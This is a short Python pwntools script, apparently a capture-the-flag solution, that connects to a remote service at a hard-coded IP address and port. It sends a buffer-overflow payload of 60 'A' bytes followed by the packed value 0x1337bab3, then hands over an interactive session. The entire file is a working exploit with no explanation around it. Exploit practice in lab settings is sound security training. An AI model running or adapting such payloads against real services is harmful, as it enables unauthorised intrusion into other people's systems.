#!/usr/bin/env python3
from pwn import *

HOST = "94.237.52.18"
PORT = 48801

def main():
    p = remote(HOST, PORT)

    payload  = b"A" * 60
    payload += p64(0x1337bab3)

    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    main()
